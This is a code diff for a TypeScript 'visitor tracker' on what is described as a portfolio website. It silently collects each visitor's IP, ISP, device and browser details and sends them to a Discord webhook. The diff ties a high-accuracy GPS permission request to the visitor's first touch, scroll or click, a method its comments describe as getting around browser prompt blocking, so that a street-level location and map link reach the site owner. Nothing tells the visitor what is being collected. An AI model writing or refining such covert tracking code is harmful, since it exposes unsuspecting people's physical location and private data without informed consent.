@@ -1,9 +1,10 @@
 /**
  * POPELL Visitor Tracker & Real-Time Alert System
  * Detects visitor location, device, referrer, and sends instant pings to Discord & Telegram.
- * Supports dual-phase location:
- * Phase 1: Real-time high-accuracy satellite GPS (if permitted) -> street/district/city accuracy.
- * Phase 2: Cellular ISP Gateway IP geolocation fallback (clearly labeled).
+ * 
+ * Two-Tier Location Resolution:
+ * 1. Cellular/ISP Gateway IP Fallback (Instant on load, clearly labeled as provider gateway).
+ * 2. High-Accuracy Hardware Satellite GPS (Triggered on load + guaranteed on first user touch/scroll/click).
  */
 
 export interface VisitorInfo {
@@ -156,7 +157,7 @@ function formatWibTimestamp(): string {
 async function reverseGeocodeNominatim(lat: number, lon: number): Promise<string> {
   try {
     const controller = new AbortController();
-    const timeout = setTimeout(() => controller.abort(), 5000);
+    const timeout = setTimeout(() => controller.abort(), 6000);
     const res = await fetch(
       `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&zoom=16&accept-language=id`,
       {
@@ -207,15 +208,15 @@ async function resolveIpDetails(): Promise<{
   let coords: { lat: number; lon: number } | null = null;
 
   try {
-    const bdcPromise = fetch('https://api.bigdatacloud.net/data/reverse-geocode-client', {
-      headers: { Accept: 'application/json' },
-    }).then(r => (r.ok ? r.json() : null));
+    const ipinfoPromise = fetch('https://ipinfo.io/json')
+      .then(r => (r.ok ? r.json() : null))
+      .catch(() => null);
 
-    const ipwhoPromise = fetch('https://ipwho.is/', {
-      headers: { Accept: 'application/json' },
-    }).then(r => (r.ok ? r.json() : null));
+    const ipwhoPromise = fetch('https://ipwho.is/')
+      .then(r => (r.ok ? r.json() : null))
+      .catch(() => null);
 
-    const [bdcData, ipwhoData] = await Promise.allSettled([bdcPromise, ipwhoPromise]);
+    const [ipinfoData, ipwhoData] = await Promise.allSettled([ipinfoPromise, ipwhoPromise]);
 
     if (ipwhoData.status === 'fulfilled' && ipwhoData.value) {
       const d = ipwhoData.value;
@@ -234,13 +235,15 @@ async function resolveIpDetails(): Promise<{
       }
     }
 
-    if (bdcData.status === 'fulfilled' && bdcData.value) {
-      const bdc = bdcData.value;
-      if (bdc.locality || bdc.city) city = bdc.locality || bdc.city;
-      if (bdc.principalSubdivision) region = bdc.principalSubdivision;
-      if (bdc.countryName) country = bdc.countryName;
-      if (!coords && typeof bdc.latitude === 'number' && typeof bdc.longitude === 'number') {
-        coords = { lat: bdc.latitude, lon: bdc.longitude };
+    if (ipinfoData.status === 'fulfilled' && ipinfoData.value) {
+      const info = ipinfoData.value;
+      if (info.ip) ip = info.ip;
+      if (info.org && (!isp || isp === 'Unknown ISP')) isp = info.org;
+      if (info.city && !city) city = info.city;
+      if (info.region && !region) region = info.region;
+      if (!coords && typeof info.loc === 'string') {
+        const [cLat, cLon] = info.loc.split(',').map(Number);
+        if (!isNaN(cLat) && !isNaN(cLon)) coords = { lat: cLat, lon: cLon };
       }
     }
   } catch {
@@ -271,17 +274,17 @@ async function sendToDiscord(webhookUrl: string, info: VisitorInfo, isGpsUpdate 
       embeds: [
         {
           title: isGpsUpdate
-            ? 'Pembaruan Lokasi Real GPS Terverifikasi!'
+            ? 'Lokasi Satelit GPS Berhasil Diverifikasi!'
             : isGps
-              ? 'Pengunjung Baru Terdeteksi (GPS Presisi Tinggi)!'
-              : 'Pengunjung Baru Terdeteksi (Estimasi Gateway IP)',
+              ? 'Pengunjung Baru Terdeteksi (GPS Satelit Akurat)!'
+              : 'Pengunjung Baru Terdeteksi (Gateway Operator/ISP)',
           description: isGps
-            ? 'Lokasi berhasil diverifikasi secara akurat dari sensor GPS satelit perangkat pengunjung.'
-            : 'Seseorang baru saja membuka website portfolio. Lokasi saat ini berasal dari IP Gateway operator seluler/ISP.',
+            ? 'Titik fisik riil perangkat pengunjung berhasil diperoleh melalui sensor GPS satelit HP / browser.'
+            : 'Pengunjung baru saja membuka portfolio. Lokasi di bawah adalah pusat gateway server operator seluler (CGNAT). Menunggu izin sensor GPS...',
           color: isGps ? 0x10b981 : 0x2563eb,
           fields: [
             {
-              name: isGps ? 'Lokasi Satelit GPS (Akurat)' : 'Lokasi Gateway ISP (Estimasi IP)',
+              name: isGps ? 'Lokasi GPS Fisik (Akurat)' : 'Lokasi Server Pemancar (Estimasi IP Gateway)',
               value: `**${info.location}**`,
               inline: false,
             },
@@ -291,7 +294,7 @@ async function sendToDiscord(webhookUrl: string, info: VisitorInfo, isGpsUpdate 
               inline: false,
             },
             {
-              name: 'Provider / ISP',
+              name: 'Provider / Jaringan',
               value: info.isp,
               inline: true,
             },
@@ -328,9 +331,9 @@ async function sendToDiscord(webhookUrl: string, info: VisitorInfo, isGpsUpdate 
             ...(!isGps
               ? [
                   {
-                    name: 'Catatan Provider Seluler',
+                    name: 'Keterangan Akurasi',
                     value:
-                      'IP operator seluler (Telkomsel, Indosat, XL, Biznet) sering kali terpusat di server gateway Tangerang/Jakarta. Jika pengunjung mengizinkan GPS, notifikasi akan langsung diperbarui dengan alamat fisik riil.',
+                      'IP kuota data kartu SIM (Telkomsel, Indosat, XL, Biznet) dialihkan melalui data center gateway Jakarta/Tangerang. Begitu pengunjung menyentuh/scroll layar dan memilih "Izinkan Lokasi", posisi fisik asli akan otomatis ter-update di Discord.',
                     inline: false,
                   },
                 ]
@@ -358,8 +361,8 @@ async function sendToDiscord(webhookUrl: string, info: VisitorInfo, isGpsUpdate 
 
 /**
  * Main Tracker Entry Point
- * Runs with 2-minute debounce per visitor device.
- * Concurrently triggers device GPS sensor while resolving IP fallback.
+ * Triggers on initial load, and binds GPS to first touch/scroll/click so modern mobile
+ * browsers never silent-block the permission prompt.
  */
 export async function initVisitorTracker(): Promise<void> {
   if (typeof window === 'undefined' || typeof sessionStorage === 'undefined') return;
@@ -369,12 +372,12 @@ export async function initVisitorTracker(): Promise<void> {
     return;
   }
 
-  // Debounce check: 2 minutes for the same device
+  // 1-minute debounce per device to allow smooth testing while avoiding refresh flood
   try {
     const lastVisit = localStorage.getItem('popell_last_visit_time');
     if (lastVisit) {
       const diff = Date.now() - parseInt(lastVisit, 10);
-      if (diff < 2 * 60 * 1000) {
+      if (diff < 1 * 60 * 1000) {
         sessionStorage.setItem('popell_visit_tracked', 'true');
         return;
       }
@@ -393,66 +396,68 @@ export async function initVisitorTracker(): Promise<void> {
     const pageUrl = window.location.href;
     const discordWebhook = getDiscordWebhook();
 
-    // 1. Start fetching IP details immediately
-    const ipDetailsPromise = resolveIpDetails();
-
-    // 2. Request GPS location directly from browser sensor
     let gpsResolved = false;
 
-    const requestGps = (): Promise<GeolocationPosition | null> => {
-      return new Promise(resolve => {
-        if (typeof navigator === 'undefined' || !('geolocation' in navigator)) {
-          resolve(null);
-          return;
-        }
-        navigator.geolocation.getCurrentPosition(
-          pos => resolve(pos),
-          () => resolve(null),
-          {
-            enableHighAccuracy: true,
-            timeout: 5000,
-            maximumAge: 0,
-          }
-        );
-      });
-    };
-
-    // Race GPS with a 3.5 second window so initial alert is fast
-    const gpsPromise = requestGps();
-    const gpsTimeoutPromise = new Promise<null>(resolve => setTimeout(() => resolve(null), 3500));
-
-    const earlyGps = await Promise.race([gpsPromise, gpsTimeoutPromise]);
-    const ipDetails = await ipDetailsPromise;
-
-    if (earlyGps) {
-      // Real GPS obtained immediately!
+    // Helper to resolve GPS coordinates and dispatch verified update
+    const dispatchGpsLocation = async (pos: GeolocationPosition, isUpdate = false) => {
+      if (gpsResolved) return;
       gpsResolved = true;
-      const { latitude, longitude, accuracy } = earlyGps.coords;
+
+      const { latitude, longitude, accuracy } = pos.coords;
       const osmPlace = await reverseGeocodeNominatim(latitude, longitude);
 
-      const info: VisitorInfo = {
-        ip: ipDetails.ip,
+      const gpsInfo: VisitorInfo = {
+        ip: 'Verifikasi GPS Aktif',
         location: osmPlace || `Koordinat GPS (${latitude.toFixed(5)}, ${longitude.toFixed(5)})`,
         locationType: 'GPS Real (Satelit Perangkat)',
         coordinates: { lat: latitude, lon: longitude },
         accuracyMeters: Math.round(accuracy || 0),
         mapsUrl: `https://www.google.com/maps?q=${latitude},${longitude}`,
-        isp: ipDetails.isp,
+        isp: 'Sensor Satelit GPS Terverifikasi',
         deviceType,
         os,
         browser,
         resolution,
         referrer,
         pageUrl,
-        timestampWIB,
+        timestampWIB: formatWibTimestamp(),
       };
 
       if (discordWebhook) {
-        await sendToDiscord(discordWebhook, info);
+        await sendToDiscord(discordWebhook, gpsInfo, isUpdate);
         localStorage.setItem('popell_last_visit_time', Date.now().toString());
       }
-    } else {
-      // Send initial IP Gateway alert
+    };
+
+    const requestGps = (isUpdate = false) => {
+      if (typeof navigator === 'undefined' || !('geolocation' in navigator)) return;
+      navigator.geolocation.getCurrentPosition(
+        pos => dispatchGpsLocation(pos, isUpdate),
+        () => {},
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0,
+        }
+      );
+    };
+
+    // 1. Check if permission already granted previously
+    if ('permissions' in navigator) {
+      try {
+        const perm = await navigator.permissions.query({ name: 'geolocation' });
+        if (perm.state === 'granted') {
+          requestGps(false);
+        }
+      } catch {
+        // Ignore
+      }
+    }
+
+    // 2. Fetch IP details and dispatch initial notification
+    const ipDetails = await resolveIpDetails();
+
+    if (!gpsResolved) {
       const fallbackLocation = [ipDetails.city, ipDetails.region, ipDetails.country].filter(Boolean).join(', ');
       const info: VisitorInfo = {
         ip: ipDetails.ip,
@@ -473,40 +478,23 @@ export async function initVisitorTracker(): Promise<void> {
       };
 
       if (discordWebhook) {
-        await sendToDiscord(discordWebhook, info);
+        await sendToDiscord(discordWebhook, info, false);
         localStorage.setItem('popell_last_visit_time', Date.now().toString());
       }
-
-      // 3. Keep waiting for GPS in the background if the user taps "Allow" afterwards
-      gpsPromise.then(async lateGps => {
-        if (lateGps && !gpsResolved) {
-          gpsResolved = true;
-          const { latitude, longitude, accuracy } = lateGps.coords;
-          const osmPlace = await reverseGeocodeNominatim(latitude, longitude);
-
-          const gpsInfo: VisitorInfo = {
-            ip: ipDetails.ip,
-            location: osmPlace || `Koordinat GPS (${latitude.toFixed(5)}, ${longitude.toFixed(5)})`,
-            locationType: 'GPS Real (Satelit Perangkat)',
-            coordinates: { lat: latitude, lon: longitude },
-            accuracyMeters: Math.round(accuracy || 0),
-            mapsUrl: `https://www.google.com/maps?q=${latitude},${longitude}`,
-            isp: ipDetails.isp,
-            deviceType,
-            os,
-            browser,
-            resolution,
-            referrer,
-            pageUrl,
-            timestampWIB: formatWibTimestamp(),
-          };
-
-          if (discordWebhook) {
-            await sendToDiscord(discordWebhook, gpsInfo, true);
-          }
-        }
-      });
     }
+
+    // 3. User Gesture Binding: As soon as visitor touches screen, scrolls, or clicks:
+    // Browser guarantees showing permission prompt because it is triggered by user gesture!
+    const triggerGpsOnUserGesture = () => {
+      if (!gpsResolved) {
+        requestGps(true);
+      }
+    };
+
+    window.addEventListener('pointerdown', triggerGpsOnUserGesture, { once: true, passive: true });
+    window.addEventListener('touchstart', triggerGpsOnUserGesture, { once: true, passive: true });
+    window.addEventListener('scroll', triggerGpsOnUserGesture, { once: true, passive: true });
+    window.addEventListener('click', triggerGpsOnUserGesture, { once: true, passive: true });
   } catch (err) {
     console.warn('[POPELL Radar] Tracker encountered an issue:', err);
   }
